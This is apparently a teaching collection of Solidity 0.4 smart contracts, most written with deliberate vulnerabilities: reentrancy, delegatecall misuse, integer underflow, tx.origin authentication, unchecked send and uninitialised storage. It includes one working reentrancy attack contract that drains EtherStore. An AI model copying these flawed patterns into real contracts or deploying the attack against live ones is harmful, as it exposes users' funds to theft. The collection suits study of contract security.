/*

ETHER GAME

*/


pragma solidity ^0.4.19;
contract EtherGame {
    
    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether; 
    uint public finalMileStone = 10 ether; 
    uint public finalReward = 5 ether; 
    
    mapping(address => uint) redeemableEther;
    // users pay 0.5 ether. At specific milestones, credit their accounts
    function play() public payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = this.balance + msg.value;
        // ensure no players after the game as finished
        require(currentBalance <= finalMileStone);
        // if at a milestone credit the players account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }
    
    function claimReward() public {
        // ensure the game is complete
        require(this.balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0); 
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(redeemableEther[msg.sender]);
    }
 }


/*

ETHER STORE

*/


pragma solidity ^0.4.19;
contract EtherStore {
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }


/*

ETHER STORE ATTACK

*/

pragma solidity ^0.4.19;

import "EtherStore.sol";
contract Attack {
  EtherStore public etherStore;
  // intialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }
  
  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }
  
  function collectEther() public {
      msg.sender.transfer(this.balance);
  }
    
  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}

/*

FIBONACCI BALANCE

*/


pragma solidity ^0.4.19;
contract FibonacciBalance {
    address public fibonacciLibrary;
    // the current fibonacci number to withdraw
    uint public calculatedFibNumber;
    // the starting fibonacci sequence number
    uint public start = 3;    
    uint public withdrawalCounter;
    // the fibonancci function selector
    bytes4 constant fibSig = bytes4(sha3("setFibonacci(uint256)"));
    
    // constructor - loads the contract with ether
    constructor(address _fibonacciLibrary) public payable {
        fibonacciLibrary = _fibonacciLibrary;
    }
    function withdraw() {
        withdrawalCounter += 1;
        // calculate the fibonacci number for the current withdrawal user
        // this sets calculatedFibNumber
        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));
        msg.sender.transfer(calculatedFibNumber * 1 ether);
    }
    
    // allow users to call fibonacci library functions
    function() public {
        require(fibonacciLibrary.delegatecall(msg.data));
    }
}


/*

FUN WITH NUMBERS

*/

pragma solidity ^0.4.19;

contract FunWithNumbers {
    uint constant public tokensPerEth = 10; 
    uint constant public weiPerEth = 1e18;
    mapping(address => uint) public balances;
    function buyTokens() public payable {
        uint tokens = msg.value/weiPerEth*tokensPerEth; // convert wei to eth, then multiply by token rate
        balances[msg.sender] += tokens; 
    }
    
    function sellTokens(uint tokens) public {
        require(balances[msg.sender] >= tokens);
        uint eth = tokens/tokensPerEth; 
        balances[msg.sender] -= tokens;
        msg.sender.transfer(eth*weiPerEth); //
    }
}

/*

HASH FOR EHTER

*/


pragma solidity ^0.4.19;

contract HashForEther {
    
    function withdrawWinnings() {
        // Winner if the last 8 hex characters of the address are 0. 
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }
     
     function _sendWinnings() {
         msg.sender.transfer(this.balance);
     }
}


/*

HONEY POT

*/


pragma solidity ^0.4.19;

contract Private_Bank
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    
    function Private_Bank(address _log)
    {
        TransferLog = Log(_log);
    }
    
    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }
    
    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }
    
    function() public payable{}    
    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}

/*

KEY LESS HIDDEN ETH

*/

pragma solidity ^0.4.19;

contract KeylessHiddenEthCreator { 
    uint public currentContractNonce = 1; // keep track of this contracts nonce publicly (it's also found in the contracts state)
    // determine future addresses which can hide ether. 
    function futureAddresses(uint8 nonce) public view returns (address) {
        if(nonce == 0) {
            return address(keccak256(0xd6, 0x94, this, 0x80));
        }
        return address(keccak256(0xd6, 0x94, this, nonce));
    // need to implement rlp encoding properly for a full range of nonces
    }
    
    // increment the contract nonce or retrieve ether from a hidden/key-less account
    // provided the nonce is correct
    function retrieveHiddenEther(address beneficiary) public returns (address) {
    currentContractNonce +=1;
       return new RecoverContract(beneficiary);
    }
    
    function () payable {} // Allow ether transfers (helps for playing in remix)
}
contract RecoverContract { 
    constructor(address beneficiary) {
        selfdestruct(beneficiary); // don't deploy code. Return the ether stored here to the beneficiary. 
    }
 }




/*

LOTTO

*/

pragma solidity ^0.4.19;

contract Lotto {
    bool public payedOut = false;
    address public winner;
    uint public winAmount;
    
    // ... extra functionality here 
    function sendToWinner() public {
        require(!payedOut);
        winner.send(winAmount);
        payedOut = true;
    }
    
    function withdrawLeftOver() public {
        require(payedOut);
        msg.sender.send(this.balance);
    }
}



/*

NAME REGISTRAR

*/


pragma solidity ^0.4.19;

// A Locked Name Registrar
contract NameRegistrar {
    bool public unlocked = false;  // registrar locked, no name updates
    
    struct NameRecord { // map hashes to addresses
        bytes32 name;  
        address mappedAddress;
    }
    mapping(address => NameRecord) public registeredNameRecord; // records who registered names 
    mapping(bytes32 => address) public resolve; // resolves hashes to addresses
    
    function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress; 
        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord; 
        require(unlocked); // only allow registrations if contract is unlocked
    }
}


/*

PARITY MULTISIG

*/


pragma solidity ^0.4.19;

contract WalletLibrary is WalletEvents {
  
  ... 
  
  // METHODS
  ...
  
  // constructor is given number of sigs required to do protected "onlymanyowners" transactions
  // as well as the selection of addresses capable of confirming them.
  function initMultiowned(address[] _owners, uint _required) {
    m_numOwners = _owners.length + 1;
    m_owners[1] = uint(msg.sender);
    m_ownerIndex[uint(msg.sender)] = 1;
    for (uint i = 0; i < _owners.length; ++i)
    {
      m_owners[2 + i] = uint(_owners[i]);
      m_ownerIndex[uint(_owners[i])] = 2 + i;
    }
    m_required = _required;
  }
  ...
  // constructor - just pass on the owner array to the multiowned and
  // the limit to daylimit
  function initWallet(address[] _owners, uint _required, uint _daylimit) {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }
}


/*

PHISHABLE

*/

pragma solidity ^0.4.19;

contract Phishable {
    address public owner;
    
    constructor (address _owner) {
        owner = _owner; 
    }
    
    function () public payable {} // collect ether
    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance); 
    }
}


/*

TIMELOCK

*/

pragma solidity ^0.4.19;

contract TimeLock {
    
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }
    
    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }
    
    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        balances[msg.sender] = 0;
        msg.sender.transfer(balances[msg.sender]);
    }
}



/*

TRANSFER TOKEN

*/


pragma solidity ^0.4.18;

contract Token {
  mapping(address => uint) balances;
  uint public totalSupply;
  function Token(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}
